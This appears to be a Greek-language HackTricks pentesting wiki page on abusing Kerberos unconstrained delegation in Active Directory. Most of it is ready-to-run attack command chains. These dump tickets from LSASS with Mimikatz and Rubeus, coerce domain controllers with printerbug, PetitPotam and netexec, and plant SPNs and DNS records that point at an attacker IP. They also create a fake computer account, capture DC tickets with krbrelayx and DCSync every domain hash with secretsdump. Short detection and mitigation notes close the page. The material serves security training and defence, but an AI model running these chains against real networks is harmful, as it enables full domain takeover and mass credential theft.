# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Πρόκειται για μια δυνατότητα που μπορεί να ορίσει ένας Domain Administrator σε οποιοδήποτε **Computer** μέσα στο domain. Έπειτα, κάθε φορά που ένας **user κάνει login** στον Computer, ένα **αντίγραφο του TGT** αυτού του user θα **σταλεί μέσα στο TGS** που παρέχεται από τον DC **και θα αποθηκευτεί στη μνήμη του LSASS**. Επομένως, αν έχετε δικαιώματα Administrator στο μηχάνημα, θα μπορείτε να **κάνετε dump τα tickets και να κάνετε impersonate τους users** σε οποιοδήποτε μηχάνημα.

Έτσι, αν ένας domain admin κάνει login σε έναν Computer με ενεργοποιημένη τη δυνατότητα "Unconstrained Delegation" και έχετε τοπικά δικαιώματα admin σε αυτό το μηχάνημα, θα μπορείτε να κάνετε dump το ticket και να κάνετε impersonate τον Domain Admin οπουδήποτε (domain privesc).

Μπορείτε να **βρείτε αντικείμενα Computer με αυτό το attribute** ελέγχοντας αν το attribute [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) περιέχει το [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Μπορείτε να το κάνετε αυτό με ένα LDAP filter ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, όπως κάνει το powerview:

```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Φορτώστε το ticket του Administrator (ή του χρήστη-θύματος) στη μνήμη με το **Mimikatz** ή το **Rubeus** για [**Pass the Ticket**](pass-the-ticket.md)**.**\
Περισσότερες πληροφορίες: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)<sup>[[2]](#references)</sup>\
[**Περισσότερες πληροφορίες για το Unconstrained delegation στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

Αν ένας attacker καταφέρει να **παραβιάσει έναν υπολογιστή που επιτρέπεται για "Unconstrained Delegation"**, θα μπορούσε να **ξεγελάσει** έναν **διακομιστή εκτύπωσης** ώστε να **συνδεθεί αυτόματα** σε αυτόν, **αποθηκεύοντας ένα TGT** στη μνήμη του διακομιστή.\
Έπειτα, ο attacker θα μπορούσε να εκτελέσει μια **επίθεση Pass the Ticket για να υποδυθεί** τον λογαριασμό υπολογιστή του διακομιστή εκτύπωσης χρήστη.

Για να κάνετε έναν διακομιστή εκτύπωσης να συνδεθεί σε οποιονδήποτε υπολογιστή, μπορείτε να χρησιμοποιήσετε το [**SpoolSample**](https://github.com/leechristensen/SpoolSample):

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

Αν το TGT προέρχεται από domain controller, μπορείς να εκτελέσεις μια [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) και να αποκτήσεις όλα τα hashes από το DC.\
[**Περισσότερες πληροφορίες για αυτή την attack στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Βρες εδώ άλλους τρόπους για να **εξαναγκάσεις authentication:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Οποιοδήποτε άλλο coercion primitive που κάνει το θύμα να κάνει authentication μέσω **Kerberos** στον host σου με unconstrained delegation λειτουργεί επίσης. Σε σύγχρονα περιβάλλοντα, αυτό συχνά σημαίνει αντικατάσταση της κλασικής ροής PrinterBug με **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** ή coercion μέσω **WebClient/WebDAV**, ανάλογα με το ποια επιφάνεια RPC είναι προσβάσιμη.

### Κατάχρηση λογαριασμού χρήστη/υπηρεσίας με unconstrained delegation

Το unconstrained delegation **δεν περιορίζεται σε computer objects**. Ένας **λογαριασμός χρήστη/υπηρεσίας** μπορεί επίσης να ρυθμιστεί ως `TRUSTED_FOR_DELEGATION`. Σε αυτό το σενάριο, η πρακτική προϋπόθεση είναι ο λογαριασμός να λαμβάνει Kerberos service tickets για ένα **SPN που του ανήκει**.

Αυτό οδηγεί σε 2 πολύ συνηθισμένες offensive διαδρομές:

1. Αποκτάς τον κωδικό πρόσβασης/hash του **user account** με unconstrained delegation και, στη συνέχεια, **προσθέτεις ένα SPN** στον ίδιο λογαριασμό.
2. Ο λογαριασμός έχει ήδη ένα ή περισσότερα SPN, αλλά ένα από αυτά δείχνει σε ένα **παλιό/αποσυρμένο hostname**· αρκεί να δημιουργήσεις ξανά την εγγραφή **DNS A** που λείπει, για να παραβιάσεις τη ροή authentication χωρίς να τροποποιήσεις τα SPN.<sup>[[8]](#references)</sup>

Ελάχιστη ροή εργασίας σε Linux:

```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
  secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```

Σημειώσεις:

- Αυτό είναι ιδιαίτερα χρήσιμο όταν το unconstrained principal είναι **service account** και έχεις μόνο τα credentials του, όχι code execution σε joined host.
- Αν ο target user έχει ήδη ένα **stale SPN**, η αναδημιουργία της αντίστοιχης **DNS record** μπορεί να προκαλέσει λιγότερο θόρυβο από την εγγραφή ενός νέου SPN στο AD.
- Πρόσφατες Linux-centric tradecraft χρησιμοποιούν τα `addspn.py`, `dnstool.py`, `krbrelayx.py` και ένα coercion primitive· δεν χρειάζεται να αγγίξεις Windows host για να ολοκληρώσεις την αλυσίδα.

### Κατάχρηση του Unconstrained Delegation με υπολογιστή που δημιουργήθηκε από επιτιθέμενο

Τα σύγχρονα domains συχνά έχουν `MachineAccountQuota > 0` (προεπιλογή 10), επιτρέποντας σε οποιοδήποτε authenticated principal να δημιουργήσει έως και N computer objects. Αν έχεις επίσης το token privilege `SeEnableDelegationPrivilege` (ή ισοδύναμα δικαιώματα), μπορείς να ορίσεις τον νεοδημιουργημένο υπολογιστή ως έμπιστο για unconstrained delegation και να συλλέξεις εισερχόμενα TGT από προνομιούχα συστήματα.<sup>[[1]](#references)</sup>

Ροή υψηλού επιπέδου:

1) Δημιούργησε έναν υπολογιστή που ελέγχεις

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) Κάντε το πλαστό hostname να επιλύεται μέσα στο domain

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) Ενεργοποίηση του Unconstrained Delegation στον υπολογιστή που ελέγχεται από τον επιτιθέμενο

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

Γιατί λειτουργεί: με unconstrained delegation, το LSA σε έναν υπολογιστή με ενεργοποιημένο το delegation αποθηκεύει στην cache τα εισερχόμενα TGT. Αν ξεγελάσετε έναν DC ή έναν προνομιούχο server ώστε να πραγματοποιήσει authentication στον ψεύτικο host σας, το machine TGT του θα αποθηκευτεί και θα μπορεί να εξαχθεί.

4) Εκκινήστε το krbrelayx σε λειτουργία export και προετοιμάστε το υλικό Kerberos

```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```

5) Εξαναγκάστε τον DC/τους servers να πραγματοποιήσουν authentication προς τον fake host σας.

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

Το krbrelayx θα αποθηκεύσει αρχεία ccache όταν πραγματοποιηθεί έλεγχος ταυτότητας από ένα μηχάνημα, για παράδειγμα:

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) Χρησιμοποιήστε το TGT του υποκλαπέντος μηχανήματος DC για να εκτελέσετε DCSync

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Σημειώσεις και απαιτήσεις:

- Το `MachineAccountQuota > 0` επιτρέπει τη δημιουργία λογαριασμών υπολογιστών χωρίς προνόμια· διαφορετικά, χρειάζεστε ρητά δικαιώματα.
- Για να ορίσετε το `TRUSTED_FOR_DELEGATION` σε έναν υπολογιστή, απαιτείται το `SeEnableDelegationPrivilege` (ή δικαιώματα domain admin).
- Βεβαιωθείτε ότι η name resolution οδηγεί στον fake host σας (DNS A record), ώστε ο DC να μπορεί να συνδεθεί σε αυτόν μέσω FQDN.
- Το coercion απαιτεί ένα λειτουργικό vector (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN κ.λπ.). Αν είναι δυνατό, απενεργοποιήστε τα στους DC.
- Αν ο λογαριασμός του θύματος έχει επισημανθεί ως **«Ο λογαριασμός είναι ευαίσθητος και δεν μπορεί να γίνει delegation»** ή είναι μέλος της ομάδας **Protected Users**, το forwarded TGT δεν θα συμπεριληφθεί στο service ticket, επομένως αυτή η αλυσίδα δεν θα αποδώσει επαναχρησιμοποιήσιμο TGT.<sup>[[9]](#references)</sup>
- Αν το **Credential Guard** είναι ενεργοποιημένο στον client/server που πραγματοποιεί το authentication, τα Windows αποκλείουν το **Kerberos unconstrained delegation**, κάτι που μπορεί να προκαλέσει αποτυχία σε κατά τα άλλα έγκυρα paths coercion από την πλευρά του operator.

Ιδέες για detection και hardening:

- Δημιουργήστε alert για τα Event ID 4741 (δημιουργία λογαριασμού υπολογιστή) και 4742/4738 (αλλαγή λογαριασμού υπολογιστή/χρήστη), όταν έχει οριστεί το UAC `TRUSTED_FOR_DELEGATION`.
- Παρακολουθείτε για ασυνήθιστες προσθήκες DNS A-record στη ζώνη του domain.
- Προσέχετε για απότομες αυξήσεις στα 4768/4769 από μη αναμενόμενους hosts και για authentications DC προς hosts που δεν είναι DC.
- Περιορίστε το `SeEnableDelegationPrivilege` σε ελάχιστο αριθμό λογαριασμών, ορίστε `MachineAccountQuota=0` όπου είναι εφικτό και απενεργοποιήστε το Print Spooler στους DC. Επιβάλετε LDAP signing και channel binding.

### Mitigation

- Περιορίστε τα DA/Admin logins σε συγκεκριμένες υπηρεσίες.
- Ορίστε την επιλογή «Ο λογαριασμός είναι ευαίσθητος και δεν μπορεί να γίνει delegation» για προνομιούχους λογαριασμούς.

## References

- [1] [HTB: Delegate — διαπιστευτήρια SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync για DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Παραβίαση domain μέσω unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (fork του CME)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation στο Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Ομάδα ασφαλείας Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Παραβίαση domain μέσω DC print server και Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
{{#include ../../banners/hacktricks-training.md}}
